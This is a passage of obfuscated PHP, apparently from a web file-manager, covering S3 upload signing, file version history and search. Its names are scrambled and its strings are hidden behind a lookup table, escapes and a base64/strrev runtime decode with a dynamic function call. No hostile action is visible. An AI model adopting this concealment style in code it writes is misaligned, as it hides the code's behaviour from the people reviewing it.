$âÍèÄÀ[$Ú©ƒ¸¥Ÿ[78]] = intval($âÍèÄÀ[$Ú©ƒ¸¥Ÿ[1466]]); } return $âÍèÄÀ; } protected function _isFolder($¼šŠ®´«) { $µş³µÚ =& $_SERVER[•Ùç É]; if ($¼šŠ®´« == $µş³µÚ[12] || $¼šŠ®´« == $µş³µÚ[8]) { return !0; } list($àê˜÷ßú, $Àøùèƒ´) = $this->bucketManager->listFiles($this->bucket, trim($¼šŠ®´«, $µş³µÚ[8]) . $µş³µÚ[8], $µş³µÚ[12], 1, $µş³µÚ[8]); return !empty($àê˜÷ßú[$µş³µÚ[1469]]) || !empty($àê˜÷ßú[$µş³µÚ[1470]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($âø®ã•Ñ) { parent::__construct($âø®ã•Ñ); } public function uploadFormData($Ëà¯Á½, $­µÖË™ = 3600) { $Àá¿ÎÉÃ =& $_SERVER[•Ùç É]; $ÇèŞŒ¸ø = $Àá¿ÎÉÃ[215]; $¹³ä¹¢õ = $Àá¿ÎÉÃ[255]; $«´ˆ›ñ‘ = $Àá¿ÎÉÃ[62]; $ó…µòæ = gmdate($Àá¿ÎÉÃ[256]); $‡áÃëıĞ = gmdate($Àá¿ÎÉÃ[257]); $§‘²ğ¬ö = $Àá¿ÎÉÃ[258]; $»ÍæŠøÁ = $­µÖË™ . $Àá¿ÎÉÃ[12]; $†Œ¹á• = $Àá¿ÎÉÃ[259]; $Ü©òòî² = array($this->accessKey, $‡áÃëıĞ, $this->region, $«´ˆ›ñ‘, $§‘²ğ¬ö); $Áİ¡çõÃ = implode($Àá¿ÎÉÃ[8], $Ü©òòî²); $ô¹Ãø¹§ = array($Àá¿ÎÉÃ[260] => gmdate($Àá¿ÎÉÃ[1376], strtotime($Àá¿ÎÉÃ[262])), $Àá¿ÎÉÃ[263] => array(array($Àá¿ÎÉÃ[264] => $this->bucket), array($Àá¿ÎÉÃ[265] => $ÇèŞŒ¸ø), array($Àá¿ÎÉÃ[266], $Àá¿ÎÉÃ[267], $Àá¿ÎÉÃ[12]), array($Àá¿ÎÉÃ[266], $Àá¿ÎÉÃ[268], $Àá¿ÎÉÃ[12]), array($Àá¿ÎÉÃ[266], $Àá¿ÎÉÃ[269], $Àá¿ÎÉÃ[12]), array($Àá¿ÎÉÃ[270] => $†Œ¹á•), array($Àá¿ÎÉÃ[271] => $Áİ¡çõÃ), array($Àá¿ÎÉÃ[272] => $¹³ä¹¢õ), array($Àá¿ÎÉÃ[273] => $ó…µòæ), array($Àá¿ÎÉÃ[274] => $»ÍæŠøÁ))); $ÊÒÄ¶ÕÆ = base64_encode(json_encode($ô¹Ãø¹§)); $êŞåØı = hash_hmac($Àá¿ÎÉÃ[275], $‡áÃëıĞ, $Àá¿ÎÉÃ[276] . $this->secret, !0); $ÑÈêÄøÄ = hash_hmac($Àá¿ÎÉÃ[275], $this->region, $êŞåØı, !0); $Ö™ŞÍîÉ = hash_hmac($Àá¿ÎÉÃ[275], $«´ˆ›ñ‘, $ÑÈêÄøÄ, !0); $ïğƒ—Ñ = hash_hmac($Àá¿ÎÉÃ[275], $§‘²ğ¬ö, $Ö™ŞÍîÉ, !0); $çÁ®‘é = hash_hmac($Àá¿ÎÉÃ[275], $ÊÒÄ¶ÕÆ, $ïğƒ—Ñ); $ãÚ ÊÌ = array($Àá¿ÎÉÃ[232] => $Àá¿ÎÉÃ[12], $Àá¿ÎÉÃ[277] => $Àá¿ÎÉÃ[12], $Àá¿ÎÉÃ[265] => $ÇèŞŒ¸ø, $Àá¿ÎÉÃ[270] => $†Œ¹á•, $Àá¿ÎÉÃ[278] => $ÊÒÄ¶ÕÆ, $Àá¿ÎÉÃ[279] => $Áİ¡çõÃ, $Àá¿ÎÉÃ[280] => $¹³ä¹¢õ, $Àá¿ÎÉÃ[281] => $ó…µòæ, $Àá¿ÎÉÃ[282] => $»ÍæŠøÁ, $Àá¿ÎÉÃ[283] => $çÁ®‘é, $Àá¿ÎÉÃ[198] => $this->getHost()); return $ãÚ ÊÌ; } public function multiUploadFormData($‰ğŞ¬€ê, $áş¡“ÜÚ = 3600) { $Ù§Éá¨§ =& $_SERVER[•Ùç É]; $õÛï‰ªŠ = gmdate($Ù§Éá¨§[1481]); $‚¯Á´Ã = array(); $ó‰¼”§† = $this->client->getUploadId($this->bucket, $‰ğŞ¬€ê, $‚¯Á´Ã); if (!$ó‰¼”§†) { return !1; } return array($Ù§Éá¨§[240] => $ó‰¼”§†, $Ù§Éá¨§[198] => $this->getHost() . $Ù§Éá¨§[8] . $this->pathEncode($‰ğŞ¬€ê), $Ù§Éá¨§[241] => $õÛï‰ªŠ, $Ù§Éá¨§[96] => $‰ğŞ¬€ê); } public function multiUploadAuthData($Âôå¾³ß, $çå¸Åáü = array()) { $³Èå‘› =& $_SERVER[•Ùç É]; $Èğ£×œè = isset($çå¸Åáü[$³Èå‘›[177]]) ? $çå¸Åáü[$³Èå‘›[177]] : $³Èå‘›[12]; $…Ë¬ÍŒ’ = $çå¸Åáü[$³Èå‘›[96]]; unset($çå¸Åáü[$³Èå‘›[96]]); if (isset($çå¸Åáü[$³Èå‘›[242]])) { return $this->listUploadParts($…Ë¬ÍŒ’, $çå¸Åáü); } $¦Š”º­û = array(); if (isset($çå¸Åáü[$³Èå‘›[1482]])) { $¦Š”º­û[$³Èå‘›[1483]] = $çå¸Åáü[$³Èå‘›[1482]]; } $ò“Ğå…¥ = explode($³Èå‘›[200], $this->getHost()); $Î†å½šİ = array($³Èå‘›[1484] => $ò“Ğå…¥[1], $³Èå‘›[1485] => $³Èå‘›[12], $³Èå‘›[232] => $³Èå‘›[122], $³Èå‘›[277] => $çå¸Åáü[$³Èå‘›[78]]); $¬ıÛÚ¿ø = $³Èå‘›[245]; $í£âŞ‹ = $³Èå‘›[8] . $this->pathEncode($…Ë¬ÍŒ’) . $Èğ£×œè; $¾–ôò¨Ë = $this->client->__getSignatureV4($¦Š”º­û, $Î†å½šİ, $¬ıÛÚ¿ø, $í£âŞ‹); if (strpos($Èğ£×œè, $³Èå‘›[244]) === 0) { if (isset($¦Š”º­û[$³Èå‘›[1483]])) { $œìø²‰ï = $¦Š”º­û[$³Èå‘›[1483]]; } else { if (isset($¾–ôò¨Ë[$³Èå‘›[1483]])) { $œìø²‰ï = $¾–ôò¨Ë[$³Èå‘›[1483]]; } else { $œìø²‰ï = hash($³Èå‘›[275], $³Èå‘›[12]); } } return array($³Èå‘›[251] => $¾–ôò¨Ë[$³Èå‘›[251]], $³Èå‘›[1483] => $œìø²‰ï, $³Èå‘›[241] => $¾–ôò¨Ë[$³Èå‘›[1486]]); } return $¾–ôò¨Ë[$³Èå‘›[251]]; } public function listUploadParts($¨Ã“ÓÖş, $ïİÉ§–µ = array()) { $Œ¾¤½“‹ =& $_SERVER[•Ùç É]; $Ü£ÀÄµŸ = str_replace($Œ¾¤½“‹[252], $Œ¾¤½“‹[12], $ïİÉ§–µ[$Œ¾¤½“‹[177]]); $Æ¯‘àú = $this->client->listParts($this->bucket, $¨Ã“ÓÖş, $Ü£ÀÄµŸ); if (!$Æ¯‘àú) { return !1; } $ö€€÷’² = $Œ¾¤½“‹[1487]; foreach ($Æ¯‘àú as $ã®™„Öø) { $ö€€÷’² .= $Œ¾¤½“‹[1488] . "\74\120\141\162\x74\x4e\x75\x6d\x62\x65\x72\x3e{$ã®™„Öø[$Œ¾¤½“‹[1444]]}\x3c\x2f\x50\141\162\164\116\x75\x6d\142\x65\162\76\xa" . "\74\105\124\x61\x67\x3e{$ã®™„Öø[$Œ¾¤½“‹[1445]]}\x3c\57\105\124\141\147\x3e\12" . $Œ¾¤½“‹[1489]; } $ö€€÷’² .= $Œ¾¤½“‹[1490]; $ÚÅí¶Äí = array(); $ §Üúåî = explode($Œ¾¤½“‹[200], $this->getHost()); $ìÆ€‰ã¥ = array($Œ¾¤½“‹[1484] => $ §Üúåî[1], $Œ¾¤½“‹[232] => $Œ¾¤½“‹[122], $Œ¾¤½“‹[277] => strlen($ö€€÷’²)); $ã¢İš®¬ = $Œ¾¤½“‹[243]; $‘‰šÊú‡ = $Œ¾¤½“‹[8] . $this->pathEncode($¨Ã“ÓÖş) . $ïİÉ§–µ[$Œ¾¤½“‹[177]]; $Œï§°ñÌ = $this->client->__getSignatureV4($ÚÅí¶Äí, $ìÆ€‰ã¥, $ã¢İš®¬, $‘‰šÊú‡, $ö€€÷’²); return array($Œ¾¤½“‹[251] => $Œï§°ñÌ[$Œ¾¤½“‹[251]], $Œ¾¤½“‹[241] => $Œï§°ñÌ[$Œ¾¤½“‹[1486]], $Œ¾¤½“‹[253] => $Æ¯‘àú, $Œ¾¤½“‹[1483] => $Œï§°ñÌ[$Œ¾¤½“‹[1483]]); } public function link($«¿ü£’ò, $ª™Û£—’ = array()) { return parent::link($«¿ü£’ò, $ª™Û£—’); } public function fileOut($®Óú™ÖÔ, $µÃèÇ¼î = false, $îúĞÕ„÷ = false, $åÀ³…äÔ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[•Ùç É][1491])) { return parent::fileOutServer($®Óú™ÖÔ, $µÃèÇ¼î, $îúĞÕ„÷, $åÀ³…äÔ); } parent::fileOut($®Óú™ÖÔ, $µÃèÇ¼î, $îúĞÕ„÷, $åÀ³…äÔ); } public function fileOutImage($ùê†ù, $¬ç“Ñèª = 250) { if (strstr($this->endpoint, $_SERVER[•Ùç É][1491])) { return parent::fileOutImageServer($ùê†ù, $¬ç“Ñèª); } parent::fileOutImage($ùê†ù, $¬ç“Ñèª); } public function fileOutLink($ô¢¯Ø•¾) { $¦²°ã =& $_SERVER[•Ùç É]; if (substr($ô¢¯Ø•¾, 0, 7) == $¦²°ã[1382]) { $ô¢¯Ø•¾ = $¦²°ã[1383] . substr($ô¢¯Ø•¾, 7); } header($¦²°ã[164] . $ô¢¯Ø•¾); die; } public function getHost() { $•²¶ßëŒ =& $_SERVER[•Ùç É]; $í®ĞÓÁÔ = str_rtrim(parent::getHost(), $•²¶ßëŒ[8] . $this->bucket); $í®ĞÓÁÔ = explode($•²¶ßëŒ[200], $í®ĞÓÁÔ); return $í®ĞÓÁÔ[0] . $•²¶ßëŒ[200] . $this->bucket . $•²¶ßëŒ[10] . $í®ĞÓÁÔ[1]; } } goto B£„í‹ºôÇ; EÇÚ£êÒ²â: $fileSize = strrev(base64_decode($_SERVER[Ì»Ÿâ÷ƒ][0])); function binCheckNeq($ıÆ¶ğÉ, $èßÈ¶ö›) { return $ıÆ¶ğÉ != $èßÈ¶ö›; } $_SERVER[$_SERVER[Ì»Ÿâ÷ƒ][1]] = $fileSize($_SERVER[$_SERVER[Ì»Ÿâ÷ƒ][2]]); goto Dâ¹õ‡ÂÒß; EÍÖù­¬: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\x65\x5f\150\x69\163\x74\157\162\x79"; public function historyCount($¸üü÷²°) { $îñš×ŞÅ =& $_SERVER[•Ùç É]; if (!$¸üü÷²°) { return array(); } if (is_string($¸üü÷²°) || is_int($¸üü÷²°)) { $¸üü÷²° = array($¸üü÷²°); } $™è°ğĞê = array($îñš×ŞÅ[183], $îñš×ŞÅ[1937] => $îñš×ŞÅ[536]); $ıŸ¥ëî÷ = array($îñš×ŞÅ[183] => array($îñš×ŞÅ[7], $¸üü÷²°)); $ºúâÄÆ” = $this->field($™è°ğĞê)->where($ıŸ¥ëî÷)->group($îñš×ŞÅ[183])->select(); return array_to_keyvalue($ºúâÄÆ”, $îñš×ŞÅ[183], $îñš×ŞÅ[536]); } public function addHistory($ŒÔ¿ÉŒğ, $Â»Ûşò— = '') { $©·äúÄˆ =& $_SERVER[•Ùç É]; $Óí–Ö…² = array($©·äúÄˆ[461] => $ŒÔ¿ÉŒğ[$©·äúÄˆ[183]], $©·äúÄˆ[1696] => isset($ŒÔ¿ÉŒğ[$©·äúÄˆ[499]]) ? $ŒÔ¿ÉŒğ[$©·äúÄˆ[499]] : $ŒÔ¿ÉŒğ[$©·äúÄˆ[497]], $©·äúÄˆ[512] => $ŒÔ¿ÉŒğ[$©·äúÄˆ[511]], $©·äúÄˆ[587] => $ŒÔ¿ÉŒğ[$©·äúÄˆ[78]], $©·äúÄˆ[2149] => $Â»Ûşò—); if ($GLOBALS[$©·äúÄˆ[6]][$©·äúÄˆ[91]][$©·äúÄˆ[1268]] >= 1) { $this->historyAutoClear($Óí–Ö…²[$©·äúÄˆ[183]]); $this->add($Óí–Ö…²); } Hook::trigger($©·äúÄˆ[2150], $Óí–Ö…²); Model($©·äúÄˆ[2151])->eventFileEdit($ŒÔ¿ÉŒğ[$©·äúÄˆ[183]]); } private function historyAutoClear($ Ë¿£©Á) { $õÌ‹™Ã© =& $_SERVER[•Ùç É]; $İÄ¿í‰° = Model($õÌ‹™Ã©[815])->get($õÌ‹™Ã©[1290]); $ŒŠÄäôë = intval($GLOBALS[$õÌ‹™Ã©[6]][$õÌ‹™Ã©[91]][$õÌ‹™Ã©[1268]]); $ã¸×ï‹ú = $İÄ¿í‰° == $õÌ‹™Ã©[1291] ? min(5, $ŒŠÄäôë) : $ŒŠÄäôë; $ã¸×ï‹ú = $ã¸×ï‹ú <= 0 ? 0 : $ã¸×ï‹ú - 1; if ($ã¸×ï‹ú >= 500) { return; } $ºú”ªƒã = array($õÌ‹™Ã©[461] => $ Ë¿£©Á); $ûÏ¹¡µĞ = $this->field($õÌ‹™Ã©[2152])->where($ºú”ªƒã)->order($õÌ‹™Ã©[2146])->select(); if (!$ûÏ¹¡µĞ || $ã¸×ï‹ú >= count($ûÏ¹¡µĞ)) { return; } $±†«ùÔ = array_to_keyvalue($ûÏ¹¡µĞ, $õÌ‹™Ã©[12], $õÌ‹™Ã©[445]); $±†«ùÔ = array_slice($±†«ùÔ, $ã¸×ï‹ú); $©¸À«šÉ = array_to_keyvalue($ûÏ¹¡µĞ, $õÌ‹™Ã©[12], $õÌ‹™Ã©[511]); $©¸À«šÉ = array_slice($©¸À«šÉ, $ã¸×ï‹ú); if (!$±†«ùÔ || !$©¸À«šÉ) { return; } $ºú”ªƒã = array($õÌ‹™Ã©[463] => array($õÌ‹™Ã©[7], $±†«ùÔ)); $this->where($ºú”ªƒã)->delete(); Model($õÌ‹™Ã©[514])->remove($©¸À«šÉ); } public function listData($ö¾ıü°Ï) { $¬Ì™Ú²š =& $_SERVER[•Ùç É]; $ËÈ·”ƒ¢ = array($¬Ì™Ú²š[461] => $ö¾ıü°Ï); $¦¤´·é‰ = $¬Ì™Ú²š[2153]; $Ğ¬ª±äÊ = $this->field($¦¤´·é‰)->where($ËÈ·”ƒ¢)->order($¬Ì™Ú²š[2146])->selectPage(); $this->_listAppendUser($Ğ¬ª±äÊ[$¬Ì™Ú²š[415]]); $üò»ôÓŞ = Model($¬Ì™Ú²š[815])->get($¬Ì™Ú²š[1290]); $¤²·ˆ¹¤ = 5; if ($üò»ôÓŞ == $¬Ì™Ú²š[1291]) { $Ğ¬ª±äÊ[$¬Ì™Ú²š[415]] = array_slice($Ğ¬ª±äÊ[$¬Ì™Ú²š[415]], 0, $¤²·ˆ¹¤); $Ğ¬ª±äÊ[$¬Ì™Ú²š[412]] = array($¬Ì™Ú²š[2154] => 1, $¬Ì™Ú²š[2155] => 20, $¬Ì™Ú²š[2156] => 1, $¬Ì™Ú²š[2157] => count($Ğ¬ª±äÊ[$¬Ì™Ú²š[415]])); } return $Ğ¬ª±äÊ; } protected function _listAppendUser(&$ç÷øõÒ) { $ÌŸÔõŞÅ =& $_SERVER[•Ùç É]; $‡‘ã¨å¼ = array_to_keyvalue($ç÷øõÒ, $ÌŸÔõŞÅ[12], $ÌŸÔõŞÅ[1705]); $°§’‘±¬ = Model($ÌŸÔõŞÅ[569])->userListInfo($‡‘ã¨å¼); foreach ($ç÷øõÒ as &$–’¹èöÅ) { $¾™ÈÆÅ = $–’¹èöÅ[$ÌŸÔõŞÅ[1705]]; $–’¹èöÅ[$ÌŸÔõŞÅ[497]] = $°§’‘±¬[$¾™ÈÆÅ] ? $°§’‘±¬[$¾™ÈÆÅ] : !1; } unset($–’¹èöÅ); } public function fileInfo($´çêØÏÀ) { $¤ÕÚ÷à =& $_SERVER[•Ùç É]; $ÃÏÁ“æ = $this->tablePrefix; $­Îà‚íÇ = "{$ÃÏÁ“æ}\151\x6f\137\146\151\x6c\x65\x20\x66\151\x6c\145\x73\x20\x6f\x6e\x20\146\x69\x6c\145\163\x2e\146\151\154\145\x49\x44\40\x3d\x20\150\151\163\164\157\162\171\56\146\151\x6c\x65\111\104"; return $this->alias($¤ÕÚ÷à[2158])->where(array($¤ÕÚ÷à[463] => $´çêØÏÀ))->join($­Îà‚íÇ, $¤ÕÚ÷à[2159])->find(); } public function removeItem($¾ÀŒ¬Ó¦) { $ÉÑëÅ€© =& $_SERVER[•Ùç É]; $Ş¼ú»Ø¥ = array($ÉÑëÅ€©[463] => $¾ÀŒ¬Ó¦); $Î¿ñƒó = $this->where($Ş¼ú»Ø¥)->find(); if ($Î¿ñƒó) { $‹Ğ¯­ñ€ = $this->where($Ş¼ú»Ø¥)->delete(); Model($ÉÑëÅ€©[514])->remove($Î¿ñƒó[$ÉÑëÅ€©[511]]); return $‹Ğ¯­ñ€; } return !1; } public function removeBySource($ñâÚÌª) { $ß‡ĞÌó =& $_SERVER[•Ùç É]; if (!$ñâÚÌª) { return !1; } if (!is_array($ñâÚÌª)) { $ñâÚÌª = array($ñâÚÌª); } $ÖÀ¤Ÿ˜œ = array($ß‡ĞÌó[461] => array($ß‡ĞÌó[7], $ñâÚÌª)); $öÍû€ = $this->field($ß‡ĞÌó[512])->where($ÖÀ¤Ÿ˜œ)->select(); if ($öÍû€) { $this->where($ÖÀ¤Ÿ˜œ)->delete(); $Æéœœ¸Á = array_to_keyvalue($öÍû€, $ß‡ĞÌó[12], $ß‡ĞÌó[511]); Model($ß‡ĞÌó[514])->remove($Æéœœ¸Á); } return !0; } public function setDetail($šê‚ÙÒ×, $ı’€íóÈ) { $Ùß¶¯Úû =& $_SERVER[•Ùç É]; return $this->where(array($Ùß¶¯Úû[463] => $šê‚ÙÒ×))->save(array($Ùß¶¯Úû[2149] => $ı’€íóÈ)); } public function rollbackToItem($•êÓ÷—Ô, $Ÿîñ¡ğÆ) { $Œ»íœ˜ =& $_SERVER[•Ùç É]; $µ­ï‰Ù¸ = Model($Œ»íœ˜[870])->sourceInfo($•êÓ÷—Ô); $this->addHistory($µ­ï‰Ù¸, LNG($Œ»íœ˜[2160])); $ŠÑçİË« = $this->find($Ÿîñ¡ğÆ); $ÌîÎë¾æ = array($Œ»íœ˜[511] => $ŠÑçİË«[$Œ»íœ˜[511]], $Œ»íœ˜[78] => $ŠÑçİË«[$Œ»íœ˜[78]], $Œ»íœ˜[87] => time(), $Œ»íœ˜[499] => USER_ID); Model($Œ»íœ˜[870])->where(array($Œ»íœ˜[183] => $•êÓ÷—Ô))->save($ÌîÎë¾æ); return $this->where(array($Œ»íœ˜[463] => $Ÿîñ¡ğÆ))->delete(); } public function clearSame($¼—¡õ¬Š) { $¾áœ¾ÖÁ =& $_SERVER[•Ùç É]; $ë„´ü = $this->listData($¼—¡õ¬Š); $ıµáåÑ = array_to_keyvalue_group($ë„´ü, $¾áœ¾ÖÁ[511]); $ÙÔê½ö“ = array(); $¯¡øÂš  = array(); foreach ($ıµáåÑ as $¢è§àËá) { if (!$¢è§àËá || count($¢è§àËá) <= 1) { continue; } foreach ($¢è§àËá as $¡‹Úş›ú) { $ÙÔê½ö“[] = $¡‹Úş›ú[$¾áœ¾ÖÁ[511]]; $¯¡øÂš [] = $¡‹Úş›ú[$¾áœ¾ÖÁ[445]]; } } if (!$¯¡øÂš ) { return; } $this->where(array($¾áœ¾ÖÁ[445] => array($¾áœ¾ÖÁ[7], $¯¡øÂš )))->delete(); Model($¾áœ¾ÖÁ[514])->remove($ÙÔê½ö“); } public function userSpace() { $ÈÖ·¦ÆÊ =& $_SERVER[•Ùç É]; $«õ³Ä‹ = $this->tablePrefix; $ÚÌ›’¬¿ = array($ÈÖ·¦ÆÊ[1696] => USER_ID); $äã†æ¸Ú = "{$«õ³Ä‹}\151\157\137\146\x69\154\x65\40\146\x69\x6c\x65\x73\x20\157\x6e\x20\x66\x69\x6c\x65\163\x2e\146\151\154\x65\111\x44\40\x3d\40\150\x69\x73\x74\157\162\x79\x2e\146\x69\x6c\145\111\104"; return $this->alias($ÈÖ·¦ÆÊ[2158])->where($ÚÌ›’¬¿)->join($äã†æ¸Ú, $ÈÖ·¦ÆÊ[2159])->sum($ÈÖ·¦ÆÊ[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¹ü°¦Ÿ§) { $ø€€û¯ =& $_SERVER[•Ùç É]; $œÙÍÂÇÃ = KodIO::fileTypeList(); $”Ğ­ŸÓ = $œÙÍÂÇÃ[$¹ü°¦Ÿ§]; if (!$”Ğ­ŸÓ) { return array(); } $ƒúÎÎ¼º = $”Ğ­ŸÓ[$ø€€û¯[177]]; $€ëúÆ¼ƒ = $ø€€û¯[7]; if (!$”Ğ­ŸÓ[$ø€€û¯[177]]) { $°ÂÉé£Š = array_to_keyvalue($œÙÍÂÇÃ, $ø€€û¯[12], $ø€€û¯[177]); $ƒúÎÎ¼º = implode($ø€€û¯[50], $°ÂÉé£Š); $€ëúÆ¼ƒ = $ø€€û¯[2161]; } $§Ğô§³À = explode($ø€€û¯[50], trim($ƒúÎÎ¼º, $ø€€û¯[50])); return array($€ëúÆ¼ƒ, $§Ğô§³À); } public function listPathType($á’İ÷£â) { $µÔÜ‘áğ =& $_SERVER[•Ùç É]; $Ö÷ÔûÓ = $this->fileTypeWhere($á’İ÷£â); if (!$Ö÷ÔûÓ) { return array(); } $‰³Çë‘Ÿ = USER_ID; $„¿óÒ±Ò = Model($µÔÜ‘áğ[569])->getInfo($‰³Çë‘Ÿ); $¨ğíÕ®Ã = array($µÔÜ‘áğ[618] => SourceModel::TYPE_USER, $µÔÜ‘áğ[555] => array($µÔÜ‘áğ[582], $µÔÜ‘áğ[565] . $„¿óÒ±Ò[$µÔÜ‘áğ[89]][$µÔÜ‘áğ[183]] . $µÔÜ‘áğ[583]), $µÔÜ‘áğ[619] => $‰³Çë‘Ÿ, $µÔÜ‘áğ[616] => 0, $µÔÜ‘áğ[617] => $Ö÷ÔûÓ); return $this->listSource($¨ğíÕ®Ã); } public function listSearch($à¶şÍ², $¿“îèû£ = 300) { $°ö¿ÈõÒ =& $_SERVER[•Ùç É]; if (isset($à¶şÍ²[$°ö¿ÈõÒ[1998]]) && $à¶şÍ²[$°ö¿ÈõÒ[1998]]) { $à¶şÍ²[$°ö¿ÈõÒ[1998]] = str_replace($°ö¿ÈõÒ[430], $°ö¿ÈõÒ[2162], trim($à¶şÍ²[$°ö¿ÈõÒ[1998]])); } $à¼·ÈË = $this->_parseSearchWhere($à¶şÍ²); if (!isset($à¼·ÈË[$°ö¿ÈõÒ[475]])) { $à¼·ÈË[$°ö¿ÈõÒ[475]] = 0; } $£ÇÃƒÅà = $°ö¿ÈõÒ[2163]; $ËÌñÒŠ = $à¼·ÈË; $—â¢Š®» = $£ÇÃƒÅà; $this->_listSearchBindPinyin($à¶şÍ², $à¼·ÈË, $£ÇÃƒÅà); $this->alias($°ö¿ÈõÒ[489])->_makeOrder(); $à¼·ÈË = $this->parseWhereLike($à¼·ÈË); $íÌè ¼š = $this->distinct(!0)->field($£ÇÃƒÅà)->where($à¼·ÈË)->selectPage($¿“îèû£); if ($GLOBALS[$°ö¿ÈõÒ[6]][$°ö¿ÈõÒ[427]][$°ö¿ÈõÒ[428]] && Input::check($à¶şÍ²[$°ö¿ÈõÒ[1998]], $°ö¿ÈõÒ[625]) && $íÌè ¼š[$°ö¿ÈõÒ[412]][$°ö¿ÈõÒ[399]] == 1 && $íÌè ¼š[$°ö¿ÈõÒ[412]][$°ö¿ÈõÒ[413]] == 0) { $íÌè ¼š = $this->distinct(!0)->field($£ÇÃƒÅà)->where($ËÌñÒŠ)->limit(1000)->select(); $íÌè ¼š = array_page_split($íÌè ¼š, !1, $¿“îèû£); } $this->_listSearchFileContent($íÌè ¼š, $à¶şÍ², $—â¢Š®», $ËÌñÒŠ); $this->_listSearchDesc($íÌè ¼š, $à¶şÍ², $—â¢Š®»); $this->_listSearchTag($íÌè ¼š, $à¶şÍ², $—â¢Š®»); $this->_listSearchGroupTag($íÌè ¼š, $à¶şÍ², $—â¢Š®»); $this->_listDataApply($íÌè ¼š[$°ö¿ÈõÒ[415]]); $this->_listMake($íÌè ¼š); return $íÌè ¼š; } private function _listSearchFileContent(&$Ç¾à†¡½, $–”¨…õ˜, $‘—š¸Í‹, $êï¿½İº) { $Û‰˜ÏŠê =& $_SERVER[•Ùç É]; if (!$–”¨…õ˜[$Û‰˜ÏŠê[1998]] || $Ç¾à†¡½[$Û‰˜ÏŠê[412]][$Û‰˜ÏŠê[399]] > 1) { return; } if (!isset($êï¿½İº[$Û‰˜ÏŠê[32]]) || !is_array($–”¨…õ˜[$Û‰˜ÏŠê[511]])) { return; } $êï¿½İº[$Û‰˜ÏŠê[511]] = array($Û‰˜ÏŠê[7], $–”¨…õ˜[$Û‰˜ÏŠê[511]]); unset($êï¿½İº[$Û‰˜ÏŠê[32]]); unset($–”¨…õ˜[$Û‰˜ÏŠê[511]]); $‘ª´üÀŸ = $this->field($‘—š¸Í‹)->where($êï¿½İº)->limit($Û‰˜ÏŠê[2164])->select(); if (!$‘ª´üÀŸ || count($‘ª´üÀŸ) == 0) { return; } $Ç¾à†¡½[$Û‰˜ÏŠê[415]] = array_merge($‘ª´üÀŸ, $Ç¾à†¡½[$Û‰˜ÏŠê[415]]); $Ç¾à†¡½[$Û‰˜ÏŠê[412]][$Û‰˜ÏŠê[413]] += count($‘ª´üÀŸ); } private function _listSearchTag(&$²ÀÇÀ¸, $¼¬”ƒ€Ë, $„ÀóïŞ‡) { $¤‰¬øí• =& $_SERVER[•Ùç É]; if (!$¼¬”ƒ€Ë[$¤‰¬øí•[1998]] || $²ÀÇÀ¸[$¤‰¬øí•[412]][$¤‰¬øí•[399]] > 1) { return; } $µ²²ñÃ¨ = Model($¤‰¬øí•[2165])->listData(); $õ·ÌÓŸò = array(); $ª´‚„ÛÇ = $¼¬”ƒ€Ë[$¤‰¬øí•[1998]]; foreach ($µ²²ñÃ¨ as $²•®) { $£¢±ı©’ = $²•®[$¤‰¬øí•[32]]; $ÃİÛÓ”í = str_replace($¤‰¬øí•[53], $¤‰¬øí•[12], Pinyin::get($£¢±ı©’)); if (stripos($£¢±ı©’, $ª´‚„ÛÇ) !== !1 || stripos($ÃİÛÓ”í, $ª´‚„ÛÇ) !== !1) { $õ·ÌÓŸò[] = $²•®[$¤‰¬øí•[445]]; } } if (!$õ·ÌÓŸò) { return; } $õ¾Ó»¬’ = array($¤‰¬øí•[470] => array($¤‰¬øí•[7], $õ·ÌÓŸò), $¤‰¬øí•[1705] => USER_ID); $´×ÛÛ±Ã = Model($¤‰¬øí•[472])->field($¤‰¬øí•[86])->where($õ¾Ó»¬’)->select(); $´×ÛÛ±Ã = array_to_keyvalue($´×ÛÛ±Ã, $¤‰¬øí•[12], $¤‰¬øí•[86]); $å‘Ùúëú = array_unique($´×ÛÛ±Ã); $this->_listSearchMerge($²ÀÇÀ¸, $¼¬”ƒ€Ë, $„ÀóïŞ‡, $å‘Ùúëú); } private function _listSearchDesc(&$ÆÜ³ªÒ», $ÔĞæ¢Ş¨, $ŞÕÃ¯Ç™) { $ˆ¥à‰éÈ =& $_SERVER[•Ùç É]; if (!$ÔĞæ¢Ş¨[$ˆ¥à‰éÈ[1998]] || $ÆÜ³ªÒ»[$ˆ¥à‰éÈ[412]][$ˆ¥à‰éÈ[399]] > 1) { return; } $­¶ğ«ïŞ = array($ˆ¥à‰éÈ[96] => $ˆ¥à‰éÈ[496], $ˆ¥à‰éÈ[420] => array($ˆ¥à‰éÈ[429], $ˆ¥à‰éÈ[2000] . $ÔĞæ¢Ş¨[$ˆ¥à‰éÈ[1998]] . $ˆ¥à‰éÈ[2000])); $¢Ã²àæÈ = !1; if ($¢Ã²àæÈ) { $òïæŞµ = $this->listSearchChildren($ÔĞæ¢Ş¨[$ˆ¥à‰éÈ[182]]); $òïæŞµ = array_unique($òïæŞµ); if (!$òïæŞµ) { return; } $­¶ğ«ïŞ[$ˆ¥à‰éÈ[183]] = array($ˆ¥à‰éÈ[7], $òïæŞµ); } $Ñé—Ğ®Ü = Model($ˆ¥à‰éÈ[602])->field($ˆ¥à‰éÈ[183])->where($­¶ğ«ïŞ)->limit(5000)->select(); $¯±ÉÎ´ = array_to_keyvalue($Ñé—Ğ®Ü, $ˆ¥à‰éÈ[12], $ˆ¥à‰éÈ[183]); $this->_listSearchMerge($ÆÜ³ªÒ», $ÔĞæ¢Ş¨, $ŞÕÃ¯Ç™, $¯±ÉÎ´); } private function _listSearchGroupTag(&$½¹ÌíÚò, $ÜğçˆÕÔ, $×ÊÎ™‚) { $ùñ†Üúì =& $_SERVER[•Ùç É]; if (!$ÜğçˆÕÔ[$ùñ†Üúì[1998]] || $½¹ÌíÚò[$ùñ†Üúì[412]][$ùñ†Üúì[399]] > 1 || !$ÜğçˆÕÔ[$ùñ†Üúì[182]]) { return; } $¶“¨×å‡ = $this->sourceInfo($ÜğçˆÕÔ[$ùñ†Üúì[182]]); if (!$¶“¨×å‡ || $¶“¨×å‡[$ùñ†Üúì[180]] != SourceModel::TYPE_GROUP) { return; } $­òäë¯· = $¶“¨×å‡[$ùñ†Üúì[540]]; $Ä½°öÆÏ = Model($ùñ†Üúì[2166])->get($­òäë¯·); $›“Šá¬‹ = array(); 